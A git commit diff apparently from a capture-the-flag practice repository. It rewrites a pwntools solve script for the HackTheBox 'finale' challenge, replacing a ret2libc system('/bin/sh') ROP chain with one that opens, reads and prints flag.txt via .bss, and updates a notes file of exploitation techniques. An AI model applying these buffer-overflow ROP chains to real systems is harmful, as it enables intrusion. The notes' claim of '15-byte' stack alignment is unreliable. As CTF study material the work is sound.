20b6271de000836524be4756c3d64d99d77c321f
Zhe Feng <zhef@umich.edu>
2026-06-13 20:55:41 -0400

    Solved pwn challenge finale with ret2plt

--- hackthebox/challenges/pwn/finale/challenge/solve.py
+++ hackthebox/challenges/pwn/finale/challenge/solve.py
@@ -26,7 +26,6 @@ def conn():
         r = process([e.path], stdin=process.PTY, stdout=process.PTY)
         gdb.attach(r, gdbscript='''
                       b *(finale+0x7d)
-                      ignore 1 1
                       c
                    ''')
     elif args.REMOTE:
@@ -38,75 +37,33 @@ def conn():
     return r
 
 
-def get_got_addr(r, got_addr):
-    rop_bin = ROP(e)
-    rop_bin.puts(got_addr)
-    rop_bin.finale()
-    payload = flat(
-            b'\x90' * 72,
-            rop_bin.chain()
-            )
-    r.sendline(payload)
-    r.recvline()
-    r.recvline()
-    r.recvline()
-    data = r.recvline()
-    addr = u64(data[:-1] + b'\x00' * 2) # Need to remove the last newline char and then fill the high address with \x00
-    return addr
-
-
 def main():
     r = conn()
-
-    # Unfortunately, there is no `syscall` in the binary so no SROP.
 
     r.sendlineafter(b'phrase:', b's34s0nf1n4l3b00')
     data = r.recvuntil(b'next year:')
     match = re.search(br'0x[0-9a-fA-F]+', data)
     # The souvenir happpens to be the start of the input string buffer.
-    souvenir = int(match.group(0), 16)
-    info(f'souvenir (the buffer start address) is {hex(souvenir)}')
+    buff_addr = int(match.group(0), 16)
+    info(f'buff_addr is {hex(buff_addr)}')
 
-    # By the following addresses, we found the target libc is libc6_2.31-0ubuntu9.14_amd64 to libc6_2.31-0ubuntu9.18_amd64
-    # But we don't need too many of them in the final attack payload.
-    puts_addr = get_got_addr(r,e.got.puts)
-    # r.recvuntil(b'next year:')
-    # info(f'puts addr is {hex(puts_addr)}')
-    # write_addr = get_got_addr(r,e.got.write)
-    # r.recvuntil(b'next year:')
-    # info(f'write addr is {hex(write_addr)}')
-    # printf_addr = get_got_addr(r,e.got.printf)
-    # info(f'printf addr is {hex(printf_addr)}')
-    r.recvuntil(b'good luck: [')
-    data = r.recvuntil(b']')[:-1]
-    buff_addr = int(data, 16)
+    rop = ROP(e)
+    flag_txt = b'flag.txt\x00'
+    rop.raw(flag_txt)
+    rop.raw(b'\x90' * (72 - len(flag_txt)))
+    rop.open(buff_addr, 0)  # The opened file handler is likely 3 based on debugging.
+    # Cannot read the file directly here because no gadget to set the rdx for read().
+    # We have to loop back to finale to use its default rdx value.
+    rop.finale()
+    r.sendline(rop.chain())
+
     r.recvuntil(b'next year:')
-
-    libc = ELF('./libc/libc.so.6')
-    puts_offset = libc.sym.puts - libc.address
-    libc.address = puts_addr - puts_offset
-    rop = ROP(libc)
-
-    # The following attack doesn't work because of "Stack Obliteration"
-    # i.e. the system() code also needs to allocate stack for itself and this overwrites the bin_sh we put on the stack.
-    # rop.system(buff_addr)
-    # bin_sh = b'/bin/sh\x00'
-    # payload = flat(
-    #         bin_sh,
-    #         b'\x90' * (72 - len(bin_sh)),
-    #         rop.find_gadget(['ret'])[0],
-    #         rop.chain(),
-    #         )
-    # r.sendline(payload)
-    
-    bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
-    rop.system(bin_sh_addr)
-    payload = flat(
-            b'\x90' * 72,
-            rop.find_gadget(['ret'])[0],
-            rop.chain(),
-            )
-    r.sendline(payload)
+    rop = ROP(e)
+    rop.raw(b'\x90' * 72)
+    bss = e.bss() + 0x20 # Need this 0x20 offset otherwise we overwrite the stdout and puts() will have no output.
+    rop.read(3, bss)
+    rop.puts(bss)
+    r.sendline(rop.chain())
 
     r.interactive()
 
--- hackthebox/challenges/pwn/summary.md
+++ hackthebox/challenges/pwn/summary.md
@@ -4,6 +4,7 @@
 - buffer overflow
 - jmp rsi to shellcode
 - ret2libc
+- ret2plt (e.g. HTB finale)
 - libc identification (e.g. HTB shooting star)
 - overwrite GOT
 - execve (syscall with 59)
@@ -14,12 +15,12 @@
 - Out-Of-Bound(OOB) write (e.g. HTB crossbow)
 - stack pivot (e.g. HTB crossbow)
 - mprotect to change NX (e.g. HTB crossbow)
-- leverage fix-address sections (e.g. .bss)
+- leverage fix-address sections (e.g. .bss, See tips)
 - one gadget (e.g. HTB spooky-time)
 
 # tips:
 
 - always try pwntools + gdb first 
 - use gdb to see the value, don't have to read the rev code and calc values in mind.
-- pay attention to the stack alignment (e.g. multiples of 15 bytes), otherwise some instructions may fail. e.g. `movaps` in printf
-
+- pay attention to the stack alignment (e.g. multiples of 15 bytes), otherwise some instructions may fail. e.g. `movaps` in printf.
+- To use .bss as the place to read/write data, you need to use (.bss + 0x20) or with more offset otherwise you may overwrite the stdin/out/err address and cause puts() to have no output.
